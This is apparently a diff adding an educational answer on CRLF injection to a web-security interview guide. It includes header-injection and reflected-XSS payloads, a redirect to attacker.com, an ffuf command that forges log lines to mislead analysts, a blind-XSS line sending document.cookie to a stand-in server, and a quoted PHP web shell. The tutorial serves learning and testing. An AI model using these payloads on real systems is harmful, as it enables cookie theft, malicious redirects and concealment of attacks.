@@ -273,7 +273,106 @@ Let's say we upload a `shell.jpg`, with `<?php system($_GET['cmd']); ?>` content
 
 I recommend trying out LFI-labs by paralax : https://github.com/paralax/lfi-labs
 
+## Question 61: Explain how CRLF Injection works and describe possible ways it could be exploited.
 
+
+**What is CRLF**<br>
+At the end of every line in HTTP request & response, there are characters, known as CRLF. These are needed, because they define where a newline starts. They are both in the HEADERS section & body seciton. CRLF is `\r\n` in ASCII, and `%0d%a` in URL encoding.
+
+Example:<br>
+![image](https://github.com/x1trap/websec-answers/assets/81029708/bc5aaea4-076d-4c98-ab8a-95821ed8410a)
+
+Notice that every header ends with `\r\n` (CRLF). When the HEADERS part is over, CRLF is used twice. Then there's body section and again, after the body ends, there's CRLF, twice. 
+
+*Note: Two CRLF's at the end of the request are always needed, otherwise your request will fail.*
+
+## **CRLF injection**
+If we can inject CRLF characters, we can make our own headers and body, which can lead to all sort of *nasty discoveries* (borrowed this from agadmator). 
+
+Let's suppose we have an application that is vulnerable to CRLF injection, in order to determine that, we construct a simple payload : `freeoscp.net/%0d%0aCRLF:Confirmed`<br>
+The response will look as follows :
+
+```HTTP
+HTTP/1.1 200 OK
+Server: crlfwaf
+blah:blah
+CRLF:Confirmed
+```
+As we can see, we've successfully injected a new header, but how to exploit it..? Let's have a look.
+
+
+### 1) RXSS
+One of the most common way to exploit CRLF injection. The idea is to make a header with `text/html` CT header & then inject body with XSS payload. First, we'll construct a payload (URL encoded) :
+`%0d%0aContent-Type:text/html%0d%0a%0d%a<script>alert(1337)</script>`
+
+`%0d%aContent-Type:%20text/html` - Newlines along with the Header that says "yep, I will treat the response as html".<br>
+`%0d%0a%0d%0aPAYLOAD` - Two CRLF's, because we are creating a body along with the XSS payload.
+
+HTTP request will look like this :
+```HTTP
+GET /%0d%0aContent-Type:text/html%0d%0a%0d%a<script>alert(1337)</script> HTTP/1.1
+Host: freeoscp.net
+User-Agent: blah blah
+...
+```
+While the response: 
+
+```http
+HTTP/1.1 200 OK
+Server: crlfwaf
+blah: blah
+Content-Type: text/html
+
+<script>alert(1337)</script>
+```
+Since the `Content-Type` is set to `text/html`, it will happily execute the code and alert will be triggered.
+
+
+### 2) Malicious Redirect
+If for some reason there's no way to exploit XSS, let's say they have an insane WAF specifically to deal with XSS, we can still make some trouble with the `Location` Header.
+
+`Location` header specifies, where the user is getting redirected. As we have control over headers, we can craft a malicious Location header, which will redirect them to a malicious website. Pretty the same impact as **Open redirect**. 
+
+
+Payload : `/%0d%0aLocation:%20https://attacker.com`<br>
+Response : `Location: https://attacker.com` (that means happily redirecting to attacker.com)
+
+
+### 3) Log Forgery
+The impact of this attack is to make traces harder to detect for analysts. While, for example, fuzzing for juicy info, we can simply throw a fake information about whatever we are doing, or simply spam the file with fake logs.
+
+For example, we are fuzzing for juicy directories and in logs, they can see something like this :
+```
+04/11/23 /secret : 404 not found
+04/11/23 /admin : 404 not found
+04/11/23 /login : 200 OK
+
+....
+```
+This can be easily seen, so why not just... fuzz like a pro :
+```
+ffuf -w common.txt -u "http://freeoscp.net/FUZZ%0D%0aThis%20is%20a%20scraper%20by%20GOOGLE%2C%20do%20not%20BLOCK%2C%20or%20we%20will%20sue%20you."
+```
+
+This would translate to something like : 
+```
+04/11/23 /secret : 404 not found
+This is a scraper by GOOGLE, do not BLOCK, or we will sue you.
+04/11/23 /hi : 404 not found
+This is a scraper by GOOGLE, do not BLOCK, or we will sue you.
+...
+```
+While I admit no one would believe that, it's just a simple demonstration what can be done with it. You could also try for some Blind XSS/PHP injection tricks, if it will be viewed via browser and not secure, you could get a hit.
+
+For Blind XSS example, you could use ez.pe, or have your own server and send a payload like : `<script>var i=new Image;i.src="https://yourserver.tld/?"+document.cookie;</script>`
+
+
+
+### 4) HTTP Request smuggling
+I'd like to write here, but well... **albinowax** already did it before me and I believe you will learn more from him than me.  Here's the link : https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning
+
+Make sure to read it and do the LAB to get some practice.
+https://portswigger.net/web-security/request-smuggling/advanced#request-smuggling-via-crlf-injection
 
 
 
